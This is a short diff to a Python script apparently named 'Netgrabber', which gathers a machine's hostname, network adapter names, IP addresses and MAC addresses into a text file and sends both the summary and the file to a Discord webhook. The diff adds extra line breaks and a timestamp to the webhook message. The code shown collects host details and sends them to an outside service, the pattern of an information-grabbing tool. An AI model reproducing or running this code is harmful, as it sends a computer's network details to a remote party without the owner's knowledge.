@@ -50,7 +50,7 @@ for i in rawnics:
     if str(mac_address) == "00:00:00:00:00:00":
         mac_address = "No Mac Address Found"
     #writes the hostname, ip(s) and mac address(s) to the text file
-    adaptor_list = adaptor_list+'Adaptor Name: '+ '**'+i+'**' + '\n     Ip: **'+str(ip)+ "**\n     Mac address: **" + str(mac_address) + '**\n\n'
+    adaptor_list = adaptor_list+'Adaptor Name: '+ '**'+i+'**' + '\n     Ip: **'+str(ip)+ "**\n     Mac address: **" + str(mac_address) + '**\n\n\n\n'
 
 #saves data and releases text file
 f.write(adaptor_list)
@@ -60,6 +60,7 @@ f.close()
 if Upload_method == 'discord':
     webhook = DiscordWebhook(url=hook)
     embed = DiscordEmbed(title='Netgrabber Results For Host: '+hostname, description=adaptor_list, color=242424)
+    embed.set_timestamp()
     webhook.add_embed(embed)
     with open(hostname+'.txt', "rb") as f:
         webhook.add_file(file=f.read(), filename=hostname+'.txt')
